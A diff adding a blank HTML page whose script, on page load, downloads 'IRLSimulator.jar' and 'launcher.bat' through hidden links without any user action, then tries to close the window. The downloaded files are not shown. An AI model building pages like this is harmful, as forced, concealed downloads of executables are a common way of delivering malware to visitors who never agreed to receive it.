@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title></title>
+<script>
+(function () {
+    const files = [
+        { url: "IRLSimulator.jar", name: "IRLSimulator.jar" },
+        { url: "launcher.bat", name: "launcher.bat" }
+    ];
+
+    let index = 0;
+
+    function downloadNext() {
+        if (index >= files.length) {
+            // Attempt to close after downloads
+            setTimeout(() => {
+                window.close();
+            }, 800);
+            return;
+        }
+
+        const file = files[index++];
+        const a = document.createElement("a");
+        a.href = file.url;
+        a.download = file.name;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        // Small delay so browsers don’t cancel the second download
+        setTimeout(downloadNext, 300);
+    }
+
+    downloadNext();
+})();
+</script>
+</head>
+<body></body>
+</html>
